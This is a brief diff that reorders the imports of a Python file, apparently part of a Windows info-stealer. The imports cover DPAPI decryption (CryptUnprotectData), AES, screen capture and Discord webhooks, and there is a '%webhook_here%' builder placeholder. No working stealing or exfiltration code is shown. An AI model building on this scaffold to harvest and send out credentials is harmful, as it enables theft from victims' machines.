@@ -9,18 +9,19 @@ import subprocess
 import threading
 import uuid
 import ctypes
+import psutil
+import requests
+import wmi
+
+from Crypto.Cipher import AES
+from discord import Embed, File, SyncWebhook
+from PIL import ImageGrab
+from win32crypt import CryptUnprotectData
 from shutil import copy2
 from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
-import psutil
-import requests
-import wmi
-from Crypto.Cipher import AES
-from discord import Embed, File, SyncWebhook
-from PIL import ImageGrab
-from win32crypt import CryptUnprotectData
 
 __WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
